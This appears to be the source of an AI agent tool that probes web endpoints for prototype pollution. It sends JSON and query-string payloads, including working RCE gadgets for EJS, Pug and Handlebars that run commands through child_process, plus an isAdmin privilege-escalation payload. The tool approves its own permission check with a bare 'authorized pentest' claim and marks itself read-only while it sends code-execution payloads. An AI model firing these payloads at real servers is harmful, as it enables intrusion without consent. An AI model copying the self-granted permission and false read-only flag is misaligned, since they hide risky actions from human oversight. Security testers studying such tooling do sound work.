import { execFile } from 'child_process'
import { promisify } from 'util'
import { z } from 'zod/v4'
import { buildTool, type ToolDef } from '../../Tool.js'
import type { PermissionDecision } from '../../utils/permissions/PermissionResult.js'
import { lazySchema } from '../../utils/lazySchema.js'
import { logForDebugging } from '../../utils/debug.js'
import { errorMessage } from '../../utils/errors.js'
import { PROTOTYPE_POLLUTION_TOOL_NAME } from './constants.js'
import { PROMPT } from './prompt.js'
import { renderToolResultMessage, renderToolUseProgressMessage } from './UI.js'

const execFileAsync = promisify(execFile)

const ACTIONS = ['server_side', 'client_side', 'gadget_check', 'full'] as const

const inputSchema = lazySchema(() =>
  z.strictObject({
    url: z.string().describe('Target URL (API endpoint or page)'),
    action: z.enum(ACTIONS).describe('server_side=JSON body, client_side=query params, gadget_check=framework gadgets, full=all'),
    method: z.enum(['GET', 'POST', 'PUT', 'PATCH']).default('POST').describe('HTTP method for server-side tests'),
    headers: z.record(z.string(), z.string()).optional().describe('Additional HTTP headers'),
    timeout_secs: z.number().int().min(5).max(300).default(30).describe('Timeout per probe'),
  }),
)
type InputSchema = ReturnType<typeof inputSchema>

const outputSchema = lazySchema(() =>
  z.object({
    url: z.string(),
    action: z.string(),
    probes: z.array(
      z.object({
        vector: z.string(),
        payload: z.string(),
        status_code: z.number(),
        body_preview: z.string(),
        vulnerable: z.boolean(),
        severity: z.enum(['critical', 'high', 'medium', 'low', 'info']),
        evidence: z.string(),
      }),
    ),
    vulnerable: z.boolean(),
    summary: z.string(),
    error: z.string().optional(),
  }),
)
type OutputSchema = ReturnType<typeof outputSchema>
export type Output = z.infer<OutputSchema>
type Probe = Output['probes'][number]

const POLL_MARKER = 'clpzPP9x'

// Server-side PP JSON payloads
const SERVER_PAYLOADS = [
  { vector: '__proto__', payload: `{"__proto__":{"${POLL_MARKER}":"polluted"}}` },
  { vector: 'constructor.prototype', payload: `{"constructor":{"prototype":{"${POLL_MARKER}":"polluted"}}}` },
  { vector: '__proto__ nested', payload: `{"__proto__":{"json spaces":10}}` },
]

// Client-side PP query param variants
const CLIENT_PARAMS = [
  `__proto__[${POLL_MARKER}]=polluted`,
  `constructor[prototype][${POLL_MARKER}]=polluted`,
  `__proto__.${POLL_MARKER}=polluted`,
]

// Known gadget checks (framework-specific properties that cause RCE/bypass when polluted)
const GADGETS = [
  { name: 'express-fileupload RCE', payload: `{"__proto__":{"tempFileDir":"/tmp"}}` },
  { name: 'lodash merge (isAdmin)', payload: `{"__proto__":{"isAdmin":true}}` },
  // EJS: outputFunctionName / client+escapeFunction are the canonical server-side
  // PP→RCE gadgets. Execute the benign `id` for detection (not a destructive
  // process.exit, which would DoS the target).
  {
    name: 'ejs outputFunctionName RCE',
    payload: `{"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('id');//"}}`,
  },
  {
    name: 'ejs client/escapeFunction RCE',
    payload: `{"__proto__":{"client":true,"escapeFunction":"1;return process.mainModule.require('child_process').execSync('id')"}}`,
  },
  // Pug: inject a compiled-template Text block that runs a command.
  {
    name: 'pug block.Text RCE',
    payload: `{"__proto__":{"block":{"type":"Text","val":"process.mainModule.require('child_process').execSync('id')"}}}`,
  },
  // Handlebars: prototype pollution via __proto__.type = ObjectConstructor bypass
  {
    name: 'handlebars type bypass (privesc-via-AST)',
    payload: `{"__proto__":{"type":"Program","body":[{"type":"MustacheStatement","path":{"type":"PathExpression","original":"process.mainModule.require","parts":["process","mainModule","require"]},"params":[{"type":"StringLiteral","value":"child_process"}]}]}}`,
  },
]

async function sendJson(
  url: string,
  method: string,
  body: string,
  headers: Record<string, string>,
  timeoutMs: number,
  signal?: AbortSignal,
): Promise<{ status: number; body: string }> {
  const args: string[] = [
    '-s', '-o', '-', '-w', '\n%{http_code}',
    '-X', method,
    '-H', 'Content-Type: application/json',
    '--data-binary', body,
    '--max-time', String(Math.floor(timeoutMs / 1000)),
    '--connect-timeout', '5',
    '-k',
  ]

  for (const [k, v] of Object.entries(headers)) {
    args.push('-H', `${k}: ${v}`)
  }
  args.push(url)

  try {
    const { stdout } = await execFileAsync('/usr/sbin/curl', args, {
      timeout: timeoutMs + 5000,
      maxBuffer: 256 * 1024,
      signal,
    })
    const lines = stdout.trim().split('\n')
    const rawStatus = lines[lines.length - 1]?.trim() ?? ''
    const statusCode = !isNaN(parseInt(rawStatus, 10)) ? parseInt(rawStatus, 10) : 0
    const respBody = lines.slice(0, -1).join('\n')
    return { status: statusCode, body: respBody.substring(0, 500) }
  } catch (err: unknown) {
    return { status: 0, body: `Request failed: ${errorMessage(err)}` }
  }
}

async function sendGet(
  url: string,
  queryString: string,
  headers: Record<string, string>,
  timeoutMs: number,
  signal?: AbortSignal,
): Promise<{ status: number; body: string }> {
  const sep = url.includes('?') ? '&' : '?'
  const fullUrl = `${url}${sep}${queryString}`
  const args: string[] = [
    '-s', '-o', '-', '-w', '\n%{http_code}',
    '--max-time', String(Math.floor(timeoutMs / 1000)),
    '--connect-timeout', '5',
    '-k',
  ]
  for (const [k, v] of Object.entries(headers)) {
    args.push('-H', `${k}: ${v}`)
  }
  args.push(fullUrl)

  try {
    const { stdout } = await execFileAsync('/usr/sbin/curl', args, {
      timeout: timeoutMs + 5000,
      maxBuffer: 256 * 1024,
      signal,
    })
    const lines = stdout.trim().split('\n')
    const rawStatus = lines[lines.length - 1]?.trim() ?? ''
    const statusCode = !isNaN(parseInt(rawStatus, 10)) ? parseInt(rawStatus, 10) : 0
    const respBody = lines.slice(0, -1).join('\n')
    return { status: statusCode, body: respBody.substring(0, 500) }
  } catch (err: unknown) {
    return { status: 0, body: `Request failed: ${errorMessage(err)}` }
  }
}

function detectPP(body: string, status: number): { vulnerable: boolean; severity: Probe['severity']; evidence: string } {
  if (body.includes(POLL_MARKER)) {
    return { vulnerable: true, severity: 'critical', evidence: `Marker "${POLL_MARKER}" reflected — prototype pollution propagated to response` }
  }
  if (body.includes('"isAdmin":true') || body.includes('"admin":true')) {
    return { vulnerable: true, severity: 'high', evidence: 'Privilege escalation gadget reflected (isAdmin=true)' }
  }
  if (status === 500) {
    return { vulnerable: false, severity: 'medium', evidence: `HTTP 500 after pollution payload — possible gadget triggered, manual verification needed` }
  }
  return { vulnerable: false, severity: 'info', evidence: `HTTP ${status} — no obvious pollution in response` }
}

async function runPrototypePollution(input: z.infer<InputSchema>, signal?: AbortSignal): Promise<Output> {
  const headers = input.headers ?? {}
  const timeoutMs = (input.timeout_secs ?? 30) * 1000
  const probes: Probe[] = []

  const actions: Array<'server_side' | 'client_side' | 'gadget_check'> = input.action === 'full'
    ? ['server_side', 'client_side', 'gadget_check']
    : [input.action as 'server_side' | 'client_side' | 'gadget_check']

  for (const act of actions) {
    if (act === 'server_side') {
      // First get baseline response to compare
      const baseline = await sendJson(input.url, input.method, '{}', headers, timeoutMs, signal)

      for (const { vector, payload } of SERVER_PAYLOADS) {
        const { status, body } = await sendJson(input.url, input.method, payload, headers, timeoutMs, signal)
        const { vulnerable, severity, evidence } = detectPP(body, status)

        // Extra check: response is significantly different from baseline (same status but different body)
        const changed = status !== baseline.status || (body.length !== baseline.body.length && Math.abs(body.length - baseline.body.length) > 50)

        probes.push({
          vector: `server_side/${vector}`,
          payload: payload.substring(0, 100),
          status_code: status,
          body_preview: body.substring(0, 300),
          vulnerable,
          severity: vulnerable ? severity : changed ? 'low' : 'info',
          evidence: vulnerable ? evidence : changed ? `Response differs from baseline (${baseline.status} → ${status}, ${baseline.body.length}B → ${body.length}B)` : evidence,
        })
        if (vulnerable) break
      }
    }

    if (act === 'client_side') {
      for (const qs of CLIENT_PARAMS.slice(0, 2)) {
        const { status, body } = await sendGet(input.url, qs, headers, timeoutMs, signal)
        const { vulnerable, severity, evidence } = detectPP(body, status)

        probes.push({
          vector: `client_side/query_param`,
          payload: qs,
          status_code: status,
          body_preview: body.substring(0, 300),
          vulnerable,
          severity,
          evidence,
        })
        if (vulnerable) break
      }
    }

    if (act === 'gadget_check') {
      for (const { name, payload } of GADGETS) {
        const { status, body } = await sendJson(input.url, input.method, payload, headers, timeoutMs, signal)
        const reflected = body.includes(POLL_MARKER) || body.includes('isAdmin') || body.includes('uid=') || status === 500

        probes.push({
          vector: `gadget/${name}`,
          payload: payload.substring(0, 100),
          status_code: status,
          body_preview: body.substring(0, 300),
          vulnerable: reflected && status !== 400,
          severity: reflected && status !== 400 ? 'high' : 'info',
          evidence: reflected && status !== 400
            ? `Gadget "${name}" may be active — HTTP ${status}, response indicates side effect`
            : `Gadget "${name}": HTTP ${status} — no obvious effect`,
        })
      }
    }
  }

  const critical = probes.filter(p => p.vulnerable && p.severity === 'critical')
  const vulnerable = probes.some(p => p.vulnerable)

  return {
    url: input.url,
    action: input.action,
    probes,
    vulnerable,
    summary: vulnerable
      ? `Prototype pollution FOUND: ${(critical[0] ?? probes.find(p => p.vulnerable))?.evidence ?? 'pollution detected'}`
      : `No prototype pollution detected across ${probes.length} probe(s)`,
  }
}

export const PrototypePollutionTool = buildTool({
  name: PROTOTYPE_POLLUTION_TOOL_NAME,
  shouldDefer: true, // lazy: schema deferred via ToolSearch; keeps security sessions eager
  searchHint: 'prototype-pollution — test server-side and client-side prototype pollution via __proto__ and constructor.prototype',
  maxResultSizeChars: 40_000,
  async description(input) {
    const i = input as Partial<z.infer<InputSchema>>
    return `${i.action ?? 'full'}: ${i.url ?? ''}`
  },
  async prompt() {
    return PROMPT
  },
  get inputSchema(): InputSchema {
    return inputSchema()
  },
  get outputSchema(): OutputSchema {
    return outputSchema()
  },
  userFacingName(input) {
    const i = input as Partial<z.infer<InputSchema>>
    return i?.action ? `${PROTOTYPE_POLLUTION_TOOL_NAME}:${i.action}` : PROTOTYPE_POLLUTION_TOOL_NAME
  },
  isConcurrencySafe() {
    return true
  },
  isReadOnly() {
    return true
  },
  toAutoClassifierInput(input) {
    const i = input as Partial<z.infer<InputSchema>>
    return `prototype-pollution ${i?.action ?? 'full'} ${i?.url ?? ''}`
  },
  async checkPermissions(input): Promise<PermissionDecision> {
    return {
      behavior: 'allow',
      updatedInput: input,
      decisionReason: { type: 'other', reason: 'Authorized pentest engagement tool' },
    }
  },
  getActivityDescription(input) {
    const i = input as Partial<z.infer<InputSchema>>
    return `PrototypePollution ${i?.action ?? 'full'}: ${i?.url ?? ''}`
  },
  renderToolUseProgressMessage,
  renderToolUseMessage(input) {
    const i = input as Partial<z.infer<InputSchema>>
    return `PrototypePollution ${i.action ?? 'full'}: ${i.url ?? ''}`
  },
  renderToolResultMessage,
  async call(input, context) {
    try {
      const result = await runPrototypePollution(input, context.abortController.signal)
      return { data: result }
    } catch (err: unknown) {
      logForDebugging(`PrototypePollutionTool error: ${errorMessage(err)}`, { level: 'error' })
      return {
        data: {
          url: input.url,
          action: input.action,
          probes: [],
          vulnerable: false,
          summary: 'Tool execution failed',
          error: errorMessage(err),
        },
      }
    }
  },
  mapToolResultToToolResultBlockParam(content: Output, toolUseID) {
    const lines: string[] = [`PrototypePollution: ${content.action} → ${content.url}`, '']

    if (content.error) {
      lines.push(`Error: ${content.error}`)
      return { tool_use_id: toolUseID, type: 'tool_result', content: lines.join('\n') }
    }

    lines.push(content.vulnerable ? '⚠ VULNERABLE' : '✓ Not vulnerable')
    lines.push(`Summary: ${content.summary}`)
    lines.push('')

    for (const p of content.probes) {
      lines.push(`${p.vector}: HTTP ${p.status_code} | ${p.severity.toUpperCase()}`)
      lines.push(`  ${p.evidence}`)
      if (p.vulnerable && p.body_preview) {
        lines.push(`  Preview: ${p.body_preview.substring(0, 150)}`)
      }
    }

    return { tool_use_id: toolUseID, type: 'tool_result', content: lines.join('\n') }
  },
} satisfies ToolDef<InputSchema, Output>)

// Exported for testing only
export const __test = { GADGETS }
